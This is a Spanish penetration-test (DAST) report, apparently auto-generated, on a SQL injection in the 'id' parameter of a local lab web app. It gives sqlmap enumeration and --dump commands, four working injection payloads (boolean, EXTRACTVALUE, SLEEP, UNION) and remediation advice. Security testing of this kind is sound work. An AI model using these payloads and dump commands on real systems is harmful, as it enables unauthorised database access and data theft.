# Informe DAST — SQL Injection

Fecha: 2026-04-13T10:23:21
Objetivo: http://web.dev.local:8083
Herramientas: curl, sqlmap

## Resumen Ejecutivo
Se detectó una vulnerabilidad de SQL Injection en el parámetro GET `id` de la página principal. La vulnerabilidad permite técnicas boolean-based blind, error-based, time-based y UNION. Se logró confirmar la inyección y obtener información del backend (usuario actual de BD y listado de bases de datos). No se consiguió extraer credenciales (usuarios/contraseñas) durante este análisis automatizado.

## Fase 1 — Reconocimiento
- Página analizada: http://web.dev.local:8083
- Vector detectado: Formulario GET con campo `id` (input name="id").
- Recurso probado manualmente: http://web.dev.local:8083/?id=1
- Archivos con salida guardados: /tmp/scan_output/root.html, /tmp/scan_output/sqlmap_id_scan.txt, y directorio de sqlmap: /root/.local/share/sqlmap/output/web.dev.local

## Fase 2 — Escaneo (sqlmap)
Comando utilizado (escaneo inicial):
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --level=3 --risk=2 --random-agent --threads=2

Resultado: sqlmap identificó el parámetro `id` como inyectable. DBMS identificado: MySQL (MariaDB fork). Técnicas detectadas:
- boolean-based blind
- error-based (EXTRACTVALUE)
- time-based (SLEEP)
- UNION query

Payloads relevantes detectados por sqlmap (copiados tal cual):
1) OR boolean-based blind:
- id=2352' OR NOT 7247=7247#&Submit=Submit

2) Error-based (EXTRACTVALUE):
- id=2352' AND EXTRACTVALUE(4611,CONCAT(0x5c,0x7176627171,(SELECT (ELT(4611=4611,1))),0x7171767871))-- EpGx&Submit=Submit

3) Time-based (SLEEP):
- id=2352' AND (SELECT 8276 FROM (SELECT(SLEEP(5)))fFmn)-- zOtb&Submit=Submit

4) UNION payload (example):
- id=2352' UNION ALL SELECT CONCAT(0x7176627171,0x72427059744f476b4d78544e587a484175417453704154766b554d6c5077574f6c754a7245786d58,0x7171767871),NULL#&Submit=Submit

## Fase 3 — Explotación
Comandos de extracción ejecutados (no interactivos, con --batch):
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --current-user --random-agent --threads=2
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --dbs --random-agent --threads=2
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --tables -D <db> --random-agent --threads=2
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id -D <db> -T <table> --dump --random-agent --threads=2

Evidencia obtenida:
- Usuario actual de la BD: 'root@%'
- Bases de datos disponibles (lista extraída por sqlmap): information_schema, mysql, performance_schema, sqli_demo, sys

Intentos de enumeración/dump:
- sqlmap pudo identificar las técnicas e hizo intentos de enumerar tablas, pero no logró volcar tablas con credenciales en este pase automatizado (varias consultas con UNION/column discovery fallaron por la estructura/respuestas del servidor y limitaciones de la técnica automática). Algunos mensajes relevantes en la salida indican falta de resultado al usar la técnica UNION completa y advertencias sobre la recuperación por tiempo.

Ruta de logs y salidas completas:
- /tmp/scan_output/sqlmap_id_scan.txt
- /tmp/scan_output/sqlmap_current_user.txt
- /tmp/scan_output/sqlmap_dbs.txt
- /tmp/scan_output/sqlmap_tables.txt
- /tmp/scan_output/sqlmap_dump_*.txt (intentos de volcado de tablas comunes)
- Salida detallada de sqlmap: /root/.local/share/sqlmap/output/web.dev.local

## Fase 4 — Conclusión y Recomendaciones
- VULN: Confirmada en `id` (GET). Impacto: acceso a información sensible de la base de datos (usuario de BD y listado de bases de datos). Aunque no se extrajeron credenciales con el escaneo automatizado, la presencia de múltiples vectores (error-based, UNION, time-based) facilita futuros intentos dirigidos y manuales para extraer datos.

Recomendaciones de mitigación prioritarias:
1. Usar consultas parametrizadas (prepared statements) para todas las entradas del lado servidor.
2. Validación y saneamiento de entradas (tipado estricto y whitelisting de valores esperados).
3. Evitar ejecutar la aplicación con una cuenta de BD con privilegios elevados; crear un usuario con mínimos privilegios para la aplicación.
4. Desactivar mensajes de error SQL en la salida al usuario; registrar errores internamente.
5. Implementar WAF y límites de tasa para reducir el riesgo de explotación automatizada.
6. Revisar y corregir las consultas que usan concatenación de parámetros en el código PHP.

## Annex — Comandos ejecutados durante el análisis
- curl -s -D /tmp/scan_output/headers.txt http://web.dev.local:8083 -o /tmp/scan_output/root.html
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --level=3 --risk=2 --random-agent --threads=2
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --current-user --random-agent --threads=2
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --dbs --random-agent --threads=2
- sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id -D <db> -T <table> --dump --random-agent --threads=2

---
Informe generado automáticamente. Copias de salida y registros se encuentran en /tmp/scan_output y en el directorio de sqlmap en la home del usuario.
